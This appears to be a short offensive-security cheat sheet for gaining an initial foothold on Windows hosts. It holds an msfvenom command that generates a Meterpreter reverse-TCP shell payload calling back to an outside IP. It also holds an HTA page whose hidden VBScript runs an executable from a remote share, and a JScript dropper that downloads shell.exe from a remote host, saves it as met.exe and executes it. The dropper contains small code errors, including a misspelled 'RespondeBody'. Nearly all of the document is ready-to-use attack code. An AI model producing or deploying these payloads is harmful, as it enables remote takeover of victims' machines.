# Initial Foothold

## Metasploit

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw > shell_10.10.14.3_4444.bin
```

### HTA


```html
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "\\10.10.14.3\share\test.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```


### JScript

```js
var url = "http://10.10.15.231/shell.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP')

Object.Open('GET', url, false)
Object.Send();

if (Object.Status = 200){
    var Stream = WScript.CreateObject('ADODB.Stream')

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.RespondeBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe")
```